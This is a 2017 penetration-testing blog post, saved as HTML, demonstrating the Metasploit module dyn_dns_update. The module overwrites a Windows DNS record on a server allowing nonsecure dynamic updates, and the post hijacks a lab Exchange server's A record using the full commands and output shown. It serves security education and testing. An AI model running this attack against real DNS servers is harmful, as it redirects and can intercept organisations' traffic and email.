<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <title>Dynamic DNS Update Module &middot; Rob &#39;mubix&#39; Fuller</title>
        <meta name="description" content="&ldquo;Secure&rdquo; DNS updates is the default in Windows, but there is an option to allow &ldquo;Nonsecure&rdquo; updates. I have seen this changed when non-Windows DHCP servers are used (eg Access Points), this opens a network up to some pretty nifty attacks that a Metasploit module just hit the ground for.

The module was originally written by King Sabri, with many touch ups and spoofing capability by busterbcook
You can read up on the pull request in pr/#8599">
        <meta name="HandheldFriendly" content="True">
        <meta name="MobileOptimized" content="320">
        <meta name="generator" content="Hugo 0.24" />
        <meta name="robots" content="index,follow">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        
        <link rel="stylesheet" href="https://room362.com/css/normalize.css">
        <link rel="stylesheet" href="https://room362.com/css/highlight.css">
        <link rel="stylesheet" href="https://room362.com/css/style.css">
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,400,600,700,300&subset=latin,cyrillic-ext,latin-ext,cyrillic">
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
    </head>
    <body>
        
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-198967-1', 'auto');
ga('send', 'pageview');
</script>


        <div id="wrapper">
            <header class="site-header">
                <div class="container">
                    <div class="site-title-wrapper">
                        
                            <h1 class="site-title">
                                <a title="Room362" href="https://room362.com/">Room362</a>
                            </h1>
                        
                        <a class="button-square" href="https://room362.com/index.xml"><i class="fa fa-rss"></i></a>
                        
                            <a class="button-square button-social hint--top" data-hint="Twitter" title="Twitter" href="https://twitter.com/mubix">
                                <i class="fa fa-twitter"></i>
                            </a>
                        
                        
                        
                            <a class="button-square button-social hint--top" data-hint="Github" title="Github" href="https://github.com/mubix">
                                <i class="fa fa-github-alt"></i>
                            </a>
                        
                        
                        
                            <a class="button-square button-social hint--top" data-hint="LinkedIn" title="LinkedIn" href="https://linkedin.com/in/mubix">
                                <i class="fa fa-linkedin"></i>
                            </a>
                        
                        
                            <a class="button-square button-social hint--top" data-hint="Google+" title="Google+" href="https://google.com/&#43;mubix">
                                <i class="fa fa-google-plus"></i>
                            </a>
                        
                    </div>

                    <ul class="site-nav">
                        
    <li class="site-nav-item">
        <a title="Brandon" href="/brandon/">Brandon</a>
    </li>

    <li class="site-nav-item">
        <a title="About Me" href="/about/">About Me</a>
    </li>

    <li class="site-nav-item">
        <a title="Start in Infosec" href="/start/">Start in Infosec</a>
    </li>

    <li class="site-nav-item">
        <a title="Projects" href="/projects/">Projects</a>
    </li>

    <li class="site-nav-item">
        <a title="PwnWiki" href="http://pwnwiki.io">PwnWiki</a>
    </li>

                    </ul>
                </div>
            </header>

            <div id="container">


<div class="container">
    <article class="post-container" itemscope="" itemtype="http://schema.org/BlogPosting">
        <header class="post-header">
    <h1 class="post-title" itemprop="name headline">Dynamic DNS Update Module</h1>
    
    <p class="post-date">
        <span>Published <time datetime="2017-06-25" itemprop="datePublished">Sun, Jun 25, 2017</time></span>
        <span>by</span>
        <span itemscope="" itemprop="author" itemtype="https://schema.org/Person">
            <span itemprop="name">
                <a href="https://twitter.com/mubix" itemprop="url" rel="author">Rob &#39;mubix&#39; Fuller</a>
            </span>
        </span>
    </p>
</header>

        <div class="post-content clearfix" itemprop="articleBody">
    

    

<p>&ldquo;Secure&rdquo; DNS updates is the default in Windows, but there is an option to allow &ldquo;Nonsecure&rdquo; updates. I have seen this changed when non-Windows DHCP servers are used (eg Access Points), this opens a network up to some pretty nifty attacks that a Metasploit module just hit the ground for.</p>

<p><center><img src="/images/2017/nonsecure_dns_updates.png" alt="" /></center></p>

<p>The module was originally written by <a href="https://twitter.com/kingsabri">King Sabri</a>, with many touch ups and spoofing capability by <a href="https://twitter.com/busterbcook">busterbcook</a></p>

<p>You can read up on the pull request in <a href="https://github.com/rapid7/metasploit-framework/pull/8599">pr/#8599</a></p>

<p>Just to drive home the point I&rsquo;ll be using my Exchange server as a target:</p>

<p><center> <strong>You will break email for the entire company if you do this on a live network. Doing so is possibly a resume generating event.</strong></center></p>

<p><center><img src="/images/2017/before_dns_update.png" alt="" /></center></p>

<p>If you are going to be overwriting an existing record make sure to keep a note of the real IP address of the host you are overwriting so that you can fix the record afterwards.</p>

<pre><code>$ dig @192.168.80.10 sdexchange.sittingduck.info

;; ANSWER SECTION:
sdexchange.sittingduck.info. 1200 IN    A   192.168.80.13
</code></pre>

<p>Here is what the module looks like:</p>

<pre><code>msf &gt; use auxiliary/admin/dns/dyn_dns_update
msf auxiliary(dyn_dns_update) &gt; show options

Module options (auxiliary/admin/dns/dyn_dns_update):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   CHOST                      no        The source address to use for queries and updates
   DOMAIN                     yes       The domain name
   HOSTNAME                   yes       The name record you want to add
   IP                         no        The IP you want to assign to the record
   RHOST                      yes       The vulnerable DNS server IP address
   TYPE      A                yes       The record type you want to add. (Accepted: A, AAAA, CNAME, TXT)
   VALUE                      no        The string to be added with TXT or CNAME record


Auxiliary action:

   Name    Description
   ----    -----------
   UPDATE  Add or update a record. (default)
</code></pre>

<p>It has 3 different actions, but you&rsquo;ll mostly want <code>UPDATE</code>. <code>UPDATE</code> will automatically delete a record if it exists already and then add the record back with your specified settings.</p>

<pre><code>msf auxiliary(dyn_dns_update) &gt; show actions

Auxiliary actions:

   Name    Description
   ----    -----------
   ADD     Add a new record. Fail if it already exists.
   DELETE  Delete an existing record.
   UPDATE  Add or update a record. (default)

</code></pre>

<p>Here are the settings I chose. Notice the IP address that I&rsquo;m injecting isn&rsquo;t on the same subnet as the domain.</p>

<pre><code>msf auxiliary(dyn_dns_update) &gt; set DOMAIN sittingduck.info
DOMAIN =&gt; sittingduck.info
msf auxiliary(dyn_dns_update) &gt; set HOSTNAME sdexchange
HOSTNAME =&gt; sdexchange
msf auxiliary(dyn_dns_update) &gt; set IP 100.100.100.100
IP =&gt; 100.100.100.100
msf auxiliary(dyn_dns_update) &gt; set RHOST 192.168.80.10
RHOST =&gt; 192.168.80.10
</code></pre>

<p>And the output:</p>

<pre><code>msf auxiliary(dyn_dns_update) &gt; run

[+] Found existing A record for sdexchange.sittingduck.info
[*] Sending dynamic DNS delete message...
[+] The record 'sdexchange.sittingduck.info =&gt; 100.100.100.100' has been deleted!
[*] Sending dynamic DNS add message...
[+] The record 'sdexchange.sittingduck.info =&gt; 100.100.100.100' has been added!
[*] Auxiliary module execution completed
msf auxiliary(dyn_dns_update) &gt;
</code></pre>

<h2 id="game-over">#Game Over</h2>

<p><img src="/images/2017/after_dns_update.png" alt="" /></p>

<p>This will stay until fixed or another dynamic DNS update is performed from the original server (ever 24 hours or so).</p>

</div>

        <footer class="post-footer clearfix">
    
        <p class="post-tags">
            <span>Tagged:</span>
            
                 <a href="/tags/dns/">dns</a>
            
                 <a href="/tags/windows/">windows</a>
            
                 <a href="/tags/ad/">ad</a>
            
        </p>
    

    <a class="muut" href="https://muut.com/i/room362/comments" type="dynamic">room362</a> <script src="//cdn.muut.com/1/moot.min.js"></script>

    <div class="share">
        <a class="icon-twitter" href="https://twitter.com/share?text=Dynamic%20DNS%20Update%20Module&url=https%3a%2f%2froom362.com%2fpost%2f2017%2fdynamic-dns-update-module%2f"
            onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
            <i class="fa fa-twitter"></i>
            <span class="hidden">Twitter</span>
        </a>

        <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2froom362.com%2fpost%2f2017%2fdynamic-dns-update-module%2f"
            onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
            <i class="fa fa-facebook"></i>
            <span class="hidden">Facebook</span>
        </a>

        <a class="icon-google-plus" href="https://plus.google.com/share?url=https%3a%2f%2froom362.com%2fpost%2f2017%2fdynamic-dns-update-module%2f"
           onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
           <i class="fa fa-google-plus"></i>
            <span class="hidden">Google+</span>
        </a>
    </div>
</footer>

        
    </article>
</div>

            </div>
        </div>

        <footer class="footer">
            <div class="container">
                <div class="site-title-wrapper">
                    <h1 class="site-title">
                        <a title="Room362" href="https://room362.com/">Room362</a>
                    </h1>
                    <a class="button-square button-jump-top js-jump-top" href="#">
                        <i class="fa fa-angle-up"></i>
                    </a>
                </div>

                <p class="footer-copyright">
                    <span>&copy; 2017 / Powered by <a href="https://gohugo.io/">Hugo</a></span>
                </p>
                <p class="footer-copyright">
                    <span><a href="https://github.com/roryg/ghostwriter">Ghostwriter theme</a> By <a href="http://jollygoodthemes.com">JollyGoodThemes</a></span>
                    <span>/ <a href="https://github.com/jbub/ghostwriter">Ported</a> to Hugo By <a href="https://github.com/jbub">jbub</a></span>
                </p>
            </div>
        </footer>

        <script src="https://room362.com/js/jquery-1.11.3.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/highlight.min.js"></script>
        <script src="https://room362.com/js/jquery.fitvids.js"></script>
        <script src="https://room362.com/js/scripts.js"></script>
    </body>
</html>

